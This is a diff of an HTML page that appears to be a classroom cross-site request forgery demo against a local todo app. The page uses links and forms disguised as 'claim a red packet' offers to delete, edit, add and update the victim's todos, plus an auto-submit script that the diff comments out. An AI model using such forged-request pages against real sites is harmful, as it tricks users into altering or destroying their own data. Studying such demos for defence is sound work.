@@ -7,26 +7,44 @@
 <body>
 <img src="http://p5shjfo1t.bkt.clouddn.com/hack.jpg">
 <!--用户不点击也中招-->
-<img src="http://0.0.0.0:4000/todo/delete/3">
+<!--<img src="http://0.0.0.0:4000/todo/delete/3">-->
 <!--通过cookie，再伪造request删除/add用户数据-->
-
-<a href="http://0.0.0.0:4000/todo/delete/4">
-    点击领取红包
+<br>
+<a href="http://0.0.0.0:4000/todo/edit/7">
+    点击edit红包
+</a>
+<br>
+<a href="http://0.0.0.0:4000/todo/delete/7">
+    点击delete红包
 </a>
 
+
 <form action="http://0.0.0.0:4000/todo/add" method="post">
-    <input type="text" value="from hack" name="title" placeholder="请输入todo">
+    <input type="text" value="from hack add" name="title" placeholder="请输入todo">
     <br>
-    <button id="add" type="submit">添加</button>
+    <button id="add" type="submit">点击add红包</button>
 </form>
+
+<form action="http://0.0.0.0:4000/todo/update" method="post">
+    <input name="id" placeholder="id" value="7">
+    <br>
+    <input type="text" value="from hack update" name="title" placeholder="请输入todo">
+    <br>
+    <button id="update" type="submit">点击update红包</button>
+</form>
+    <br>
+    <a href="http://0.0.0.0:4000/todo/status_switch/9?status=True">设置为-完成</a>
+    <a href="http://0.0.0.0:4000/todo/status_switch/9?status=False">设置为-未完成</a>
+
 
 <script>
     <!--自动提交-->
-    let e = function(sel) {
-        return document.querySelector(sel)
-    }
-
-    e('#add').click()
+    {#todo 注释怎么变成这个样子#}
+    {#let e = function(sel) {#}
+    {#    return document.querySelector(sel)#}
+    {#}#}
+    {##}
+    {#e('#add').click()#}
 </script>
 
 </body>
